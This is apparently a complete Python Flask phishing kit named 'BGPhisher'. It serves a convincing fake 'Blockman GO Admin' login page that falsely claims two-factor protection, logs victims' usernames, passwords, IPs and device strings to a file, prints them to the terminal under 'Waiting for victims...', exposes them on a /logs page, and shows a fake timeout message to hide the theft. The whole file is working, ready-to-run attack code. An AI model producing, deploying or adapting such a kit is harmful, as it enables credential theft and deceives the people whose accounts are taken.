import os
import sys
from flask import Flask, request, render_template_string, jsonify
import datetime

# Clear terminal
os.system('cls' if os.name == 'nt' else 'clear')

# Colors for terminal
class Colors:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    O = '\033[38;5;208m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    BD = '\033[1m'
    E = '\033[0m'

# Print banner
print(f"""{Colors.O}
╔══════════════════════════════════════════════════════╗
║ {Colors.Y}{Colors.BD}██████╗  ██████╗ ██████╗  ██╗███████╗██╗{Colors.O} ║
║ {Colors.Y}{Colors.BD}██╔══██╗██╔════╝██╔════╝ ██║██╔════╝██║{Colors.O} ║
║ {Colors.Y}{Colors.BD}██████╔╝██║     ██║  ███╗██║███████╗██║{Colors.O} ║
║ {Colors.Y}{Colors.BD}██╔══██╗██║     ██║   ██║██║╚════██║██║{Colors.O} ║
║ {Colors.Y}{Colors.BD}██████╔╝╚██████╗╚██████╔╝██║███████║██║{Colors.O} ║
║ {Colors.Y}{Colors.BD}╚═════╝  ╚═════╝ ╚═════╝ ╚═╝╚══════╝╚═╝{Colors.O} ║
║                                                      ║
║     {Colors.C}{Colors.BD}Blockman GO Phisher. Author~ Act|WastelandX. Colors.E}{Colors.O}         ║
║     {Colors.W}{Colors.BD}fake identity:XnoneGC.AdminPanel{Colors.E}{Colors.O}       ║
╚══════════════════════════════════════════════════════╝{Colors.E}
""")

print(f"{Colors.C}═"*50 + f"{Colors.E}")
print(f"{Colors.G}{Colors.BD}🚀 BGPhisher Server Started{Colors.E}")
print(f"{Colors.C}═"*50 + f"{Colors.E}\n")

print(f"{Colors.Y}{Colors.BD}📡 Server:{Colors.E}")
print(f"  {Colors.W}► Local:   {Colors.C}http://127.0.0.1:8080{Colors.E}")
print(f"  {Colors.W}► Network: {Colors.C}http://[YOUR-IP]:8080{Colors.E}")
print(f"  {Colors.W}► Panel:   {Colors.M}XnoneGC.AdminPanel v3.8{Colors.E}")

print(f"\n{Colors.Y}{Colors.BD}📊 Logs:{Colors.E}")
print(f"  {Colors.W}► File:   {Colors.M}captured.txt{Colors.E}")
print(f"  {Colors.W}► View:   {Colors.C}http://127.0.0.1:8080/logs{Colors.E}")

print(f"\n{Colors.Y}{Colors.BD}⚡ Commands:{Colors.E}")
print(f"  {Colors.W}► Check IP: {Colors.G}ifconfig{Colors.E}")
print(f"  {Colors.W}► View logs:{Colors.G} cat captured.txt{Colors.E}")
print(f"  {Colors.W}► Stop:     {Colors.R}Ctrl + C{Colors.E}")

print(f"\n{Colors.Y}{Colors.BD}🔔 Status:{Colors.E} {Colors.G}● Waiting for victims...{Colors.E}")
print(f"{Colors.C}═"*50 + f"{Colors.E}\n")

app = Flask(__name__)

# Show captured credentials in terminal
def show_creds(user, passw, ip, agent):
    print(f"\n{Colors.G}{'█'*50}{Colors.E}")
    print(f"{Colors.O}{Colors.BD}🎯 CREDENTIALS CAPTURED!{Colors.E}")
    print(f"{Colors.G}{'█'*50}{Colors.E}")
    
    print(f"\n{Colors.Y}{Colors.BD}📅 Time:{Colors.E} {Colors.W}{datetime.datetime.now().strftime('%H:%M:%S')}{Colors.E}")
    print(f"{Colors.R}{Colors.BD}🖥️  IP:{Colors.E} {Colors.C}{ip}{Colors.E}")
    print(f"{Colors.B}{Colors.BD}👤 Username:{Colors.E} {Colors.M}{user}{Colors.E}")
    print(f"{Colors.B}{Colors.BD}🔑 Password:{Colors.E} {Colors.M}{passw}{Colors.E}")
    
    if len(agent) > 40:
        agent = agent[:40] + "..."
    print(f"{Colors.W}{Colors.BD}🌐 Device:{Colors.E} {Colors.W}{agent}{Colors.E}")
    
    print(f"\n{Colors.G}✓ Saved: captured.txt{Colors.E}")
    print(f"{Colors.G}✓ View: http://127.0.0.1:8080/logs{Colors.E}")
    print(f"{Colors.G}{'█'*50}{Colors.E}")
    print(f"{Colors.Y}{Colors.BD}🔔 Status:{Colors.E} {Colors.G}● Waiting...{Colors.E}\n")

# Save to file
def save_creds(user, passw, ip, agent):
    with open("captured.txt", "a", encoding="utf-8") as f:
        f.write(f"\n{'═'*50}\n")
        f.write(f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"IP: {ip}\n")
        f.write(f"Username: {user}\n")
        f.write(f"Password: {passw}\n")
        f.write(f"Device: {agent[:80]}\n")
        f.write(f"{'═'*50}\n")

# Improved HTML page
LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockman GO Admin</title>
    <style>
        :root {
            --orange: #FF6A00;
            --orange-dark: #E55A00;
            --orange-light: #FF8C3A;
            --bg: #0D0A08;
            --card: #1A120B;
            --text: #FFFFFF;
            --text-light: #FFD1A8;
            --border: #FF8C3A;
            --error: #FF4757;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        
        body {
            background: var(--bg);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 420px;
            animation: fadeIn 0.4s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .logo {
            font-size: 38px;
            font-weight: 900;
            color: var(--orange);
            text-shadow: 0 0 10px rgba(255, 106, 0, 0.3);
            margin-bottom: 5px;
        }
        
        .badge {
            display: inline-block;
            color: var(--text-light);
            background: rgba(255, 106, 0, 0.1);
            padding: 6px 15px;
            border-radius: 15px;
            font-size: 13px;
            font-weight: 600;
            border: 1px solid rgba(255, 106, 0, 0.3);
        }
        
        .card {
            background: var(--card);
            border-radius: 18px;
            padding: 30px;
            border: 2px solid var(--border);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
        }
        
        .title {
            color: var(--text);
            font-size: 22px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 25px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .label {
            display: block;
            color: var(--text-light);
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .input-box {
            position: relative;
        }
        
        .input {
            width: 100%;
            padding: 14px 16px 14px 45px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 140, 58, 0.3);
            border-radius: 10px;
            color: var(--text);
            font-size: 15px;
            transition: all 0.3s;
        }
        
        .input:focus {
            outline: none;
            border-color: var(--orange);
            box-shadow: 0 0 0 3px rgba(255, 106, 0, 0.15);
        }
        
        .icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--orange-light);
        }
        
        .security {
            background: rgba(255, 106, 0, 0.05);
            border-radius: 10px;
            padding: 16px;
            margin: 20px 0;
            border: 1px solid rgba(255, 140, 58, 0.2);
        }
        
        .security-title {
            color: var(--text-light);
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .security-item {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 8px;
            font-size: 13px;
            color: var(--text-light);
        }
        
        .check {
            color: #2ED573;
            font-size: 12px;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(to right, var(--orange), var(--orange-dark));
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        .btn:hover {
            background: linear-gradient(to right, var(--orange-dark), var(--orange));
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 106, 0, 0.3);
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 15px 0;
        }
        
        .spinner {
            display: inline-block;
            width: 28px;
            height: 28px;
            border: 3px solid rgba(255, 106, 0, 0.2);
            border-radius: 50%;
            border-top-color: var(--orange);
            animation: spin 1s linear infinite;
            margin-bottom: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .alert {
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 15px;
            display: none;
            font-size: 13px;
            font-weight: 500;
        }
        
        .alert-error {
            background: rgba(255, 71, 87, 0.1);
            border: 1px solid rgba(255, 71, 87, 0.3);
            color: var(--error);
        }
        
        .alert-info {
            background: rgba(255, 106, 0, 0.1);
            border: 1px solid rgba(255, 106, 0, 0.3);
            color: var(--text-light);
        }
        
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        
        .link {
            color: var(--text-light);
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
        }
        
        .link:hover {
            color: var(--orange-light);
            text-decoration: underline;
        }
        
        .footer {
            text-align: center;
            margin-top: 25px;
            color: rgba(255, 209, 168, 0.6);
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 10px;
            }
            
            .card {
                padding: 25px 20px;
            }
            
            .logo {
                font-size: 32px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">BLOCKMAN GO</div>
            <div class="badge">XnoneGC.AdminPanel v3.8</div>
        </div>
        
        <div class="card">
            <div class="title">Admin Authentication</div>
            
            <div class="alert alert-error" id="alert">⚠️ Please fill all fields</div>
            
            <form id="form">
                <div class="form-group">
                    <label class="label">Admin Username</label>
                    <div class="input-box">
                        <input type="text" name="user" class="input" placeholder="administrator" required>
                        <span class="icon">👤</span>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="label">Admin Password</label>
                    <div class="input-box">
                        <input type="password" name="pass" class="input" placeholder="••••••••" required>
                        <span class="icon">🔒</span>
                    </div>
                </div>
                
                <div class="security">
                    <div class="security-title">🛡️ Security Verification</div>
                    <div class="security-item">
                        <span class="check">✓</span>
                        <span>Two-factor authentication active</span>
                    </div>
                    <div class="security-item">
                        <span class="check">✓</span>
                        <span>Session encryption enabled</span>
                    </div>
                </div>
                
                <button type="submit" class="btn" id="loginBtn">AUTHENTICATE & ACCESS PANEL</button>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <div style="color: var(--text-light); font-size: 13px;">Verifying credentials...</div>
                </div>
            </form>
            
            <div class="links">
                <a href="#" class="link">🔑 Password Reset</a>
                <a href="#" class="link">📧 Support</a>
                <a href="#" class="link">📋 Audit Logs</a>
            </div>
        </div>
        
        <div class="footer">
            © 2024 Blockman GO. All rights reserved.<br>
            <div style="margin-top: 8px; font-size: 11px;">
                <span style="color: #2ED573;">●</span>
                <span style="color: var(--text-light);"> Connected to secure server</span>
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const user = document.querySelector('input[name="user"]').value.trim();
            const pass = document.querySelector('input[name="pass"]').value.trim();
            const btn = document.getElementById('loginBtn');
            const loading = document.getElementById('loading');
            const alert = document.getElementById('alert');
            
            if (!user || !pass) {
                alert.textContent = '⚠️ Please fill in all fields';
                alert.style.display = 'block';
                return;
            }
            
            btn.style.display = 'none';
            loading.style.display = 'block';
            alert.style.display = 'none';
            
            await new Promise(r => setTimeout(r, 1000));
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user, pass })
                });
                
                const data = await response.json();
                
                if (data.status === 'ok') {
                    loading.querySelector('div:last-child').textContent = 'Establishing secure connection...';
                    await new Promise(r => setTimeout(r, 1200));
                    
                    alert.textContent = '🔐 Secure connection established...';
                    alert.className = 'alert alert-info';
                    alert.style.display = 'block';
                    
                    await new Promise(r => setTimeout(r, 1000));
                    
                    alert.textContent = '⚠️ Authentication timeout. Please try again.';
                    alert.className = 'alert alert-error';
                    
                    setTimeout(() => {
                        this.reset();
                        btn.style.display = 'block';
                        loading.style.display = 'none';
                        alert.style.display = 'none';
                    }, 1500);
                }
            } catch (error) {
                alert.textContent = '🌐 Network connection error';
                alert.style.display = 'block';
                btn.style.display = 'block';
                loading.style.display = 'none';
            }
        });
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(LOGIN_HTML)

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        user = data.get('user', '').strip()
        passw = data.get('pass', '').strip()
        if user and passw:
            ip = request.remote_addr
            agent = request.headers.get('User-Agent', 'Unknown')
            save_creds(user, passw, ip, agent)
            show_creds(user, passw, ip, agent)
            return jsonify({"status": "ok"})
    except:
        pass
    return jsonify({"status": "error"})

@app.route('/logs')
def logs():
    try:
        with open("captured.txt", "r", encoding="utf-8") as f:
            data = f.read()
    except:
        data = "No data captured yet."
    
    html = f'''
    <html><body style="background:#0D0A08;color:#FFD1A8;padding:20px;font-family:monospace;">
    <h2 style="color:#FF6A00;border-bottom:2px solid #FF8C3A;padding-bottom:10px;">
        🔐 BGPhisher - Captured Credentials
    </h2>
    <pre style="background:#1A120B;padding:15px;border-radius:8px;border:1px solid #FF8C3A;">{data}</pre>
    <br>
    <a href="/" style="color:#FFB347;font-weight:bold;">← Back to Login</a>
    </body></html>
    '''
    return html

if __name__ == '__main__':
    # Create log file
    if not os.path.exists("captured.txt"):
        with open("captured.txt", "w", encoding="utf-8") as f:
            f.write("BGPhisher Logs\n" + "═"*50 + "\n")
    
    # Start server
    try:
        app.run(host='127.0.0.1', port=8080, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Colors.R}{'═'*50}{Colors.E}")
        print(f"{Colors.R}{Colors.BD}✗ Server stopped{Colors.E}")
        print(f"{Colors.R}{'═'*50}{Colors.E}")
        sys.exit(0)